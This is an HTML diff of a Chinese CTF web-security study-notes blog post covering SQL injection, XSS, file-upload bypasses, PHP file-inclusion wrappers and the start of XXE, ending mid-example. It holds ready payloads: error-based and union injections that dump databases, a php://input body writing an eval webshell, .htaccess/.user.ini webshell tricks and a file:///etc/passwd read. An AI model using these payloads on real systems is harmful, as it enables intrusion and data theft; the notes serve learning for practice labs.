@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CTF_Web 学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-web基础">
+<meta property="og:url" content="https://ka1t4v.github.io/2020/02/02/CTF_Web%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Ka1t4v">
+<meta property="og:description" content="CTF_Web 学习笔记">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/5cdd825914cdc11533.jpg">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/20190509154902917.png">
+<meta property="article:published_time" content="2020-02-02T05:23:20.000Z">
+<meta property="article:modified_time" content="2022-08-02T10:54:36.568Z">
+<meta property="article:author" content="Ka1t4v">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/5cdd825914cdc11533.jpg">
+
+<link rel="canonical" href="https://ka1t4v.github.io/2020/02/02/CTF_Web%E5%9F%BA%E7%A1%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>CTF-web基础 | Ka1t4v</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ka1t4v</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ka1t4v.github.io/2020/02/02/CTF_Web%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+      <meta itemprop="name" content="Ka1t4v">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ka1t4v">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF-web基础
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-02-02 13:23:20" itemprop="dateCreated datePublished" datetime="2020-02-02T13:23:20+08:00">2020-02-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CTF-Web-学习笔记"><a href="#CTF-Web-学习笔记" class="headerlink" title="CTF_Web 学习笔记"></a>CTF_Web 学习笔记</h1><span id="more"></span>
+
+<h2 id="0x00-信息搜集和网站目录扫描"><a href="#0x00-信息搜集和网站目录扫描" class="headerlink" title="0x00 信息搜集和网站目录扫描"></a>0x00 信息搜集和网站目录扫描</h2><blockquote>
+<p>robots.txt</p>
+<p>.bak 备份文件</p>
+<p>wwwroot.zip  或  <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+</blockquote>
+<p>以上这些文件里可能会有一些关键的信息，或者网站源码，主要泄露原因还是由于管理员的疏忽</p>
+<p>并且可以用一些好用的扫描工具如：御剑（扫描网站后台）同样对于字典的扩充也很重要</p>
+<h2 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h2><p>产生原因：程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造 SQL 语句；编写代码时未对用户可控参数进行足够的过滤便将参数内容拼接进入到 SQL 语句</p>
+<p>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM flag WHERE id = &#x27;payload&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么如果此时构造的payload字符串为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>整个sql查询语句会变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM flag WHERE id = &#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此时WHERE后面的调剂为永真，就会返回所有的值。</p>
+<h3 id="常见的SQL注入方法"><a href="#常见的SQL注入方法" class="headerlink" title="常见的SQL注入方法"></a>常见的SQL注入方法</h3><h4 id="联合查询注入："><a href="#联合查询注入：" class="headerlink" title="联合查询注入："></a>联合查询注入：</h4><p>主要使用UNION函数，将前面查询闭合之后进行union之后的查询</p>
+<p>并且可以结合mysql数据库中的特殊数据库，来获得整个数据库信息</p>
+<h4 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h4><p>当判断正确时，有一个回显，判断错误时，有另一个回显。可以使用布尔盲注。</p>
+<p>主要在闭合后使用and连接后面的判断语句，当后面的判断语句为真时，整个结果为真，反之为否。</p>
+<p>相关函数：length(),ascii(),substr()</p>
+<h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h4><p>主要使用了sleep()函数，和if语句，当结果正确时执行sleep(),可以根据是否感觉到延迟来判断猜解是否正确。</p>
+<p>相关函数：sleep(),if(),length(),ascii()</p>
+<h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>常用三函数：</p>
+<ul>
+<li>floor()</li>
+<li>extractvalue()</li>
+<li>uodatexml()</li>
+</ul>
+<h5 id="xpath语法错误："><a href="#xpath语法错误：" class="headerlink" title="xpath语法错误："></a>xpath语法错误：</h5><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue()</code>和<code>updatexml()</code>两个函数。</p>
+<p>extractvalue(目标xml文档，xml路径)  对XML文档进行查询的函数 注入点：xml路径<br>updatexml(目标xml文档，xml路径，更新的内容)  是更新xml文档的函数 注入点：xml路径</p>
+<h5 id="extractvalue："><a href="#extractvalue：" class="headerlink" title="extractvalue："></a>extractvalue：</h5><p>当输入的xml路径满足要求时，会报错，并且将查询结果放在报错信息中，所以可以利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyload：&#x27;and(select extractvalue(&quot;anything&quot;,concat(&#x27;~&#x27;,(select语句))))</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))</span><br><span class="line">&#x27;and(select extractvalue(1,concat(0x7e,@@version)))</span><br></pre></td></tr></table></figure>
+
+<p>针对mysql数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">爆字段名：&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure>
+
+<h5 id="updatexml："><a href="#updatexml：" class="headerlink" title="updatexml："></a>updatexml：</h5><p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&#x27;and(select updatexml(&quot;anything&quot;,concat(&#x27;~&#x27;,(select语句())),&quot;anything&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select updatexml(1,concat(&#x27;~&#x27;,(select database())),1))</span><br><span class="line">&#x27;and(select updatexml(1,concat(0x7e,@@database),1))</span><br></pre></td></tr></table></figure>
+
+<p>同样，针对mysql：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h5 id="concat-rand-group-by-导致主键重复："><a href="#concat-rand-group-by-导致主键重复：" class="headerlink" title="concat+rand()+group_by()导致主键重复："></a>concat+rand()+group_by()导致主键重复：</h5><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p>
+<p>rand()：</p>
+<pre><code>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字
+</code></pre>
+<p>floor()：</p>
+<pre><code>对任意正或者负的十进制值向下取整
+</code></pre>
+<p>通常利用这两个函数的方法是floor(rand(0)*2) ,其会生成0和1两个数</p>
+<p>group by</p>
+<pre><code>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：
+SELECT column_name, aggregate_function(column_name)
+FROM table_name
+WHERE column_name operator value
+GROUP BY column_name
+</code></pre>
+<p>常见的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from &quot;一个足大的表&quot; group by x)a</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
+
+<p>利用information_schema.tables表，相似的还可以用information_schema.columns等</p>
+<p>为了使结构能够更方便的查看，可以在concat()中添加一些内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1 from (select count(*),concat((select user()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
+
+<p>之后还是将select语句改为一般的注入语句就可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
+
+<p>不能使用group_concat函数，所以用limit语句来限制查询结果的列数</p>
+<h4 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;insert into users(id,username,password) values (&#x27;38&#x27;,&#x27;less38&#x27;,&#x27;hello&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>用；可以分开两个不同的sql语句，所以可用；结束一个sql语句然后执行后面构造的sql语句，堆叠注入与其他不同的是，可以构造增删查改操作的sql语句。</p>
+<p>注：sql默认一次只能执行一条语句，所以堆叠注入产生的条件比较苛刻，需要服务器端访问数据库时使用的是支持多条语句同时执行的方法</p>
+<p>例如php中需要使用mysqli_multi_query()方法而不是mysqli_query()</p>
+<h4 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h4><p>GBK编码体制：会将两个字节认为成一个汉字（前一个ASCII码要大于128，才达到汉字的范围）</p>
+<p>那么就可以通过构造输入的方式，将注入时WAF添加的反斜杠’ \ ‘转义字符消除掉，从而实现闭合</p>
+<p>主要是针对 addslashes 过滤函数，这个函数会在 ‘（单引号）“（双引号）\（反斜线）NULL（NULL字符）</p>
+<p>前加上反斜线  \  使得字符被转义，无法进行sql注入闭合</p>
+<p>所以对于addslashes函数的绕过就需要使用宽字节注入</p>
+<p>也可以在前面再加一个 \ 将 \转义 ，绕过限制</p>
+<p>而一般来说，更多使用宽字节注入</p>
+<p>首先假设输入1’</p>
+<p>转义过程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; -&gt; 1\&#x27; -&gt;1%5C%27</span><br></pre></td></tr></table></figure>
+
+<p>如果进行宽字节注入输入1%df’</p>
+<p>转义过程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; -&gt; 1%df\&#x27; -&gt;1%df%5C%27</span><br></pre></td></tr></table></figure>
+
+<p>而此时由于时GBK编码</p>
+<p>%df%5C会被当做一个汉字，从而绕过了转义字符，使得后面的单引号成功闭合语句，成功执行后面的注入语句</p>
+<h3 id="常见过滤绕过方法"><a href="#常见过滤绕过方法" class="headerlink" title="常见过滤绕过方法"></a>常见过滤绕过方法</h3><ul>
+<li>双写绕过</li>
+<li>将字符转换为16进制，前面带上0x</li>
+<li>代替等于号的方法： !(x&lt;&gt;y)  和  x regexp y 和 x in (select y)</li>
+<li>代替空格的方法    &#x2F;**&#x2F;   和   %0A</li>
+<li>字符串截断  #</li>
+</ul>
+<h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02 XSS"></a>0x02 XSS</h2><p>XSS(Cross Site Scripting)跨站脚本攻击产生原因：由于未对用户输入的数据进行过滤，于时可以向WEB页面里插入恶意HTML代码，当用户浏览该页之时，嵌入其中Web里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。</p>
+<p>简单payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>常见的xss类型：</p>
+<ul>
+<li><p>反射型xss</p>
+</li>
+<li><p>存储型xss</p>
+</li>
+<li><p>DOM型xss</p>
+</li>
+</ul>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>XSS代码在URL中，当用户点击URL的时候，XSS代码随响应内容一起传回给浏览器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/?params=&lt;script&gt;alert(’xss‘)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说PAYLOAD存储在URL中</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>XSS代码存储在服务器中，只要有用户访问包含XSS代码的页面，就会触发XSS代码</p>
+<p>最常见场景是留言板和贴吧回帖</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>修改页面的DOM节点，利用非法输入来闭合对应的html标签</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/5cdd825914cdc11533.jpg" alt="img"></p>
+<p>DOM( Document Object Model，文档对象模型 ) 是通过使用 JavaScript 代码从服务器 ( 源代码 ) 接收到的 HTML 文档上构建的结果程序。 这里<code>localStorage</code>是数据来源，<code>innerHTML</code>是接受并执行。</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul>
+<li>对payload进行各种编码</li>
+<li>XSS过滤绕过速查表</li>
+</ul>
+<h2 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h2><h3 id="工具，靶场推荐"><a href="#工具，靶场推荐" class="headerlink" title="工具，靶场推荐"></a>工具，靶场推荐</h3><p>产生原因：不对被上传的文件进行限制或过滤</p>
+<p>常用工具：</p>
+<ul>
+<li>中国菜刀</li>
+<li>蚁剑</li>
+</ul>
+<p>用于管理我们上传的webshell</p>
+<p>推荐upload-labs靶场进行练习，里面几乎包括了所有文件上传漏洞</p>
+<h3 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h3><p>.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.(htaccess|htpasswd)$&quot;&gt;</span><br><span class="line">deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">Options +Indexes</span><br><span class="line">order deny,allow</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>.user.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=code.png</span><br></pre></td></tr></table></figure>
+
+<p>​    基础的比如修改Content-type、大小写绕过、00截断、双写绕过、文件解析漏洞什么的，可以做一做上面提到的那个文件上传靶场，很快就可以掌握。</p>
+<p>​    这里来说说这两个点</p>
+<ul>
+<li><p>.htaccess</p>
+<p>前提条件：apache<br>.htaccess：分布式配置文件，全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，我们可以通过上传这个文件从而对目录下文件的解析方法进行控制，如何进行利用呢？<br>SetHandler application&#x2F;x-httpd-php<br>主要是这一行，在头上加这个，就会把当前目录下的所有文件当作php文件来执行<br>具体看下这个第四关，首先来看源码</p>
+</li>
+<li><p>.user.ini</p>
+<p>前提条件：fastcgi运行的php<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，而且.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。<br>这个配置项有很多很多，我们来列举其中的一个，类似文件包含：<br>auto_prepend_file&#x3D;code.png<br>首先上传一个图片马，然后获取其相对路径，修改上面这句配置，加到.user.ini中，上传这个ini文件这样我们可以借助.user.ini让所有php文件都“自动”包含我们的一句话的webshell。</p>
+</li>
+</ul>
+<h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，以节省开发时间。</p>
+<p>产生原因：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<p>常见文件包含函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见伪协议"><a href="#常见伪协议" class="headerlink" title="常见伪协议"></a>常见伪协议</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>使用条件：<br>allow_url_fopen ：off<br>allow_url_include：off</p>
+<p>利用它进行base64编码，读取网页源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=lfi.php</span><br><span class="line">?filename=php://filter/read=convert.base64-encode/resource=lfi.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>使用条件：<br>allow_url_include：on</p>
+<p>可以获取post的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url: ?filename=php://input</span><br><span class="line">POST: &lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[xx])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F"><a href="#zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zip://</span><br><span class="line">?filename=zip://www/file.jpg%23code.txt</span><br><span class="line">bzip2://</span><br><span class="line">?filename=compress.bzip2://./code.jpg</span><br><span class="line">zlib://</span><br><span class="line">?filename=compress.zlib://./code.jpg</span><br></pre></td></tr></table></figure>
+
+<h4 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?filename=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<h3 id="ctf中常用php伪协议"><a href="#ctf中常用php伪协议" class="headerlink" title="ctf中常用php伪协议"></a>ctf中常用php伪协议</h3><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/20190509154902917.png" alt="img"></p>
+<h2 id="0x05-XXE"><a href="#0x05-XXE" class="headerlink" title="0x05 XXE"></a>0x05 XXE</h2><p>XXE Injection（XML External Entity Injection）<br>XML 外部实体注入攻击。XML 文档结构里定义了实体（entity）这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容。</p>
+<h3 id="什么是XML文档"><a href="#什么是XML文档" class="headerlink" title="什么是XML文档"></a>什么是XML文档</h3><p>在企业开发中，前端和后端交换数据的时候，一般都不会直接返回字符串，因为字符串容易出问题。而是返回XML或者JSON格式的数据。</p>
+<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+<p>例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span 